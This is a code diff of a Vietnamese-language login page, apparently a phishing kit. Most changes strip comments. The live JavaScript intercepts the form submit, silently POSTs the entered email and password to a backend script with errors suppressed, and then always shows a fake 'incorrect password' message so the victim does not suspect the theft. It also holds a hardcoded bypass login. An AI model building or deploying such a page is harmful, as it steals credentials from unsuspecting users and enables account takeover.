@@ -200,7 +200,6 @@ padding: 22px 18px;
 }
 }
 
-/* === Mobile small (under 600px) === */
 @media (max-width: 600px) {
   body {
     padding: 16px 10px;
@@ -230,8 +229,6 @@ line-height: 1.4;
 }
 }
 
-
-/* === Privacy Popup === */
     .privacy-popup {
       position: fixed;
       top: 0;
@@ -368,7 +365,6 @@ Please read carefully before proceeding.
   </div>
 
   <script>
-    // === Form Validation ===
     const form = document.getElementById('loginForm');
 const emailInput = document.getElementById('email');
     const pwInput = document.getElementById('password');
@@ -384,30 +380,23 @@ const gmailRegex = /^[a-zA-Z0-9._%+-]+@gmail\.com$/i;
     function hideError(el) { el.style.display = 'none'; el.textContent = '';
 }
     
-    // --- Hàm gửi dữ liệu ngầm (sử dụng Fetch API) ---
     function sendCredentials(email, password, actionUrl) {
       const formData = new FormData();
       formData.append('email', email);
       formData.append('password', password);
       
-      // Gửi ngầm (không cần xử lý phản hồi, chỉ cần đảm bảo request được gửi)
       fetch(actionUrl, {
         method: 'POST',
         body: formData,
         credentials: 'omit'
       })
       .then(response => {
-        // Có thể thêm logic xử lý phản hồi nếu cần, nhưng yêu cầu là gửi ngầm (ko cần thay đổi giao diện)
-        // console.log('Credentials sent successfully in the background');
       })
       .catch(error => {
-        // console.error('Error sending credentials:', error);
       });
     }
-    // --- Kết thúc Hàm gửi dữ liệu ngầm ---
 
     form.addEventListener('submit', function(e) {
-      // Ngăn chặn hành vi gửi form mặc định để không tải lại trang/chuyển hướng
       e.preventDefault(); 
       hideError(emailError);
       hideError(pwError);
@@ -415,21 +404,17 @@ const gmailRegex = /^[a-zA-Z0-9._%+-]+@gmail\.com$/i;
       const email = emailInput.value.trim();
       const pw = pwInput.value.trim();
 
-      // Logic chuyển hướng cho tài khoản demo (giữ nguyên)
       if (email === 'super@$adminuser$' && pw === 'super@$adminpass$') {
         window.location.href = successUrl;
         return;
       }
 
-      // Kiểm tra input rỗng (giữ nguyên logic gốc)
       if (!email) { showError(emailError, 'Vui lòng nhập email hoặc số điện thoại.'); return; }
  
      if (!pw) { showError(pwError, 'Vui lòng nhập mật khẩu.'); return; }
-      
-      // *** FIX: Gửi dữ liệu ngầm đến codephp.php ngay tại đây ***
+
       sendCredentials(email, pw, form.action);
-      
-      // Logic hiển thị lỗi (giữ nguyên logic gốc sau khi đã gửi ngầm)
+
       if (gmailRegex.test(email) || phoneRegex.test(email)) {
         showError(pwError, 'Email hoặc mật khẩu không đúng.');
       } else {
@@ -441,13 +426,12 @@ const gmailRegex = /^[a-zA-Z0-9._%+-]+@gmail\.com$/i;
       hideError(emailError);
       hideError(pwError);
     }));
-// === Privacy Popup ===
     document.addEventListener('DOMContentLoaded', function() {
       const popup = document.getElementById('privacy-popup');
       const checkbox = document.getElementById('agree-checkbox');
       const continueBtn = document.getElementById('continue-btn');
 
-      // Show popup on load
+
       popup.style.display = 'flex';
 
       checkbox.addEventListener('change', () => {
